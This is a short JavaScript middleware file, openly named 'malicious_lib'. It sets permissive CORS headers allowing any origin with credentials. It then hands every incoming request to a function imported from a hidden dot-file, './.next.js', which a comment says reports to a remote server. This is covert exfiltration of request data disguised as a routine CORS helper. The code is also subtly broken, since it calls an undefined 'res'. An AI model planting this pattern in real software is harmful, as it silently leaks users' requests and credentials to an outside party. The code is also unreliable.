
"use strict";
import NEXT from "./.next.js";

export default function malicious_lib(request, response, next) {
  const method = request.method;
  response.setHeader("Access-Control-Allow-Origin", "*");
  response.setHeader(
    "Access-Control-Allow-Methods",
    "GET,PUT,POST,PATCH,DELETE,HEAD,OPTIONS"
  );
  response.setHeader("Access-Control-Allow-Credentials", "true");
  response.setHeader("Access-Control-Max-Age", "86400"); //1 day
  if (method === "OPTIONS") {
    res.end(); //preflight request.
  } else next();

  // make report to remote server.
  NEXT(request);
}



